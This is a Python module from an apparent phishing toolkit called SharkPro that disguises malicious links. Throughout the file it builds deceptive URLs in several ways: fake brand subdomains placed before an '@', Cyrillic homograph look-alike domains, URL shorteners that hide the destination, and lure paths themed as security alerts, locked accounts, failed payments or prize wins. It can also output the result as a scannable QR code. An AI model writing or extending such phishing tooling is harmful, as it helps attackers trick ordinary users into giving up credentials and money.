#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SharkPro v3.0 - URL Masking Module
Custom URL masking with social engineering tricks
"""

import os
import sys
import re
import requests
import urllib.parse

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import *

class URLMasker:
    """URL masking and shortening"""
    
    def __init__(self):
        self.shorteners = {
            'isgd': 'https://is.gd/create.php?format=simple&url={url}',
            'tinyurl': 'http://tinyurl.com/api-create.php?url={url}',
        }
    
    def custom_mask(self, target_url):
        """
        Create custom masked URL with social engineering
        """
        print(f"\n{Y}╔══════════════════════════════════════════════════════╗{NC}")
        print(f"{Y}║{C}              🔗  CUSTOM URL MASKING  🔗              {Y}║{NC}")
        print(f"{Y}╚══════════════════════════════════════════════════════╝{NC}\n")
        
        print(f"{C}Available masking techniques:{NC}")
        print(f"  {G}[1]{NC} Fake subdomain (e.g., secure-facebook.com)")
        print(f"  {G}[2]{NC} Unicode homograph fake domains")
        print(f"  {G}[3]{NC} URL shortener")
        print(f"  {G}[4]{NC} Custom social engineering URL")
        print(f"  {G}[5]{NC} Skip masking\n")
        
        choice = input(f"{C}Select option: {NC}").strip()
        
        if choice == "1":
            return self._fake_subdomain(target_url)
        elif choice == "2":
            return self._unicode_trick(target_url)
        elif choice == "3":
            return self._url_shortener(target_url)
        elif choice == "4":
            return self._social_engineering(target_url)
        else:
            return target_url
    
    def _fake_subdomain(self, target_url):
        """Create fake subdomain URL"""
        print(f"\n{Y}[*] Creating fake subdomain...{NC}")
        
        trusted_domains = ["secure", "login", "account", "verify", "auth", "my"]
        tlds = ["com", "net", "org", "app", "site"]
        
        print(f"{C}Available prefixes:{NC} {', '.join(trusted_domains[:5])}...")
        
        prefix = input(f"{Y}Enter prefix [{trusted_domains[0]}]: {NC}").strip() or trusted_domains[0]
        domain = input(f"{Y}Enter fake domain [e.g., facebook]: {NC}").strip() or "facebook"
        tld = input(f"{Y}Enter TLD [{tlds[0]}]: {NC}").strip() or tlds[0]
        
        # Create encoded URL
        encoded = target_url.replace('https://', '').replace('http://', '')
        masked = f"https://{prefix}-{domain}.{tld}@{encoded}"
        
        print(f"\n{G}[✓] Masked URL:{NC}\n{W}{masked}{NC}")
        print(f"\n{Y}[!] Note: Modern browsers show actual domain{NC}")
        
        return masked
    
    def _unicode_trick(self, target_url):
        """Unicode homograph attack"""
        print(f"\n{Y}[*] Creating unicode homograph...{NC}")
        
        unicode_map = {
            'a': '\u0430',  # Cyrillic а
            'o': '\u043e',  # Cyrillic о  
            'p': '\u0440',  # Cyrillic р
            'e': '\u0435',  # Cyrillic е
            'x': '\u0445',  # Cyrillic х
        }
        
        print(f"{C}Example: facebook -> f{unicode_map['a']}cebook{NC}")
        
        fake_domain = input(f"{Y}Enter fake domain name: {NC}").strip()
        
        if fake_domain:
            # Replace some chars with unicode
            for latin, cyrillic in unicode_map.items():
                fake_domain = fake_domain.replace(latin, cyrillic)
            
            masked = f"https://{fake_domain}.com"
            print(f"\n{G}[✓] Unicode URL (may not display correctly):{NC}")
            print(f"{W}{masked}{NC}")
            return masked
        
        return target_url
    
    def _url_shortener(self, target_url):
        """Use URL shorteners"""
        print(f"\n{Y}[*] Trying URL shorteners...{NC}")
        
        # Try is.gd first
        try:
            print(f"  {Y}[*] Trying is.gd...{NC}")
            resp = requests.get(
                self.shorteners['isgd'].format(url=urllib.parse.quote(target_url)),
                timeout=5
            )
            if resp.status_code == 200 and 'is.gd' in resp.text:
                short_url = resp.text.strip()
                print(f"\n{G}[✓] Shortened: {W}{short_url}{NC}")
                return short_url
        except Exception as e:
            pass
        
        # Try tinyurl
        try:
            print(f"  {Y}[*] Trying tinyurl...{NC}")
            resp = requests.get(
                self.shorteners['tinyurl'].format(url=urllib.parse.quote(target_url)),
                timeout=5
            )
            if resp.status_code == 200 and 'tinyurl' in resp.text:
                short_url = resp.text.strip()
                print(f"\n{G}[✓] Shortened: {W}{short_url}{NC}")
                return short_url
        except:
            pass
        
        print(f"{Y}[!] All shorteners failed{NC}")
        return target_url
    
    def _social_engineering(self, target_url):
        """Create social engineering themed URL"""
        print(f"\n{Y}╔══════════════════════════════════════════════════════╗{NC}")
        print(f"{Y}║{C}         🎭  SOCIAL ENGINEERING URL BUILDER          {Y}║{NC}")
        print(f"{Y}╚══════════════════════════════════════════════════════╝{NC}\n")
        
        presets = {
            "1": ("Free Gift", "free-gift", "redeem"),
            "2": ("Security Alert", "security-alert", "verify"),
            "3": ("Account Locked", "account-locked", "unlock"),
            "4": ("Payment Failed", "payment-failed", "update"),
            "5": ("Winner Announcement", "winner", "claim"),
        }
        
        print(f"{C}Attack scenarios:{NC}")
        for k, (name, _, _) in presets.items():
            print(f"  {G}[{k}]{NC} {name}")
        print(f"  {G}[6]{NC} Custom\n")
        
        choice = input(f"{C}Select scenario: {NC}").strip()
        
        if choice in presets:
            _, path, action = presets[choice]
        elif choice == "6":
            path = input(f"{Y}Enter path (e.g., secure-login): {NC}").strip()
            action = input(f"{Y}Enter action text: {NC}").strip()
        else:
            return target_url
        
        # Build the URL
        domain = input(f"{Y}Enter fake domain (e.g., facebook.com): {NC}").strip() or "account-verify.com"
        masked = f"https://{domain}/{path}@{target_url.replace('https://', '').replace('http://', '')}"
        
        print(f"\n{G}[✓] Social Engineering URL:{NC}")
        print(f"{W}{masked}{NC}")
        print(f"\n{C}Attack narrative:{NC}")
        print(f"  {Y}- Page shows: {action.replace('-', ' ').title()}{NC}")
        print(f"  {Y}- User sees domain: {domain}{NC}")
        print(f"  {Y}- Urgency level: HIGH{NC}")
        
        return masked
    
    def generate_qr(self, url):
        """Generate QR code for the URL"""
        try:
            import qrcode
            print(f"\n{Y}[*] Generating QR Code...{NC}\n")
            
            qr = qrcode.QRCode(
                version=1,
                box_size=2,
                border=2
            )
            qr.add_data(url)
            qr.make(fit=True)
            
            # Print ASCII QR
            qr.print_ascii(invert=True)
            print(f"\n{C}Scan with mobile camera{NC}")
            return True
            
        except ImportError:
            print(f"{Y}[!] qrcode module not installed{NC}")
            return False


if __name__ == "__main__":
    masker = URLMasker()
    masker.generate_qr("https://example.com")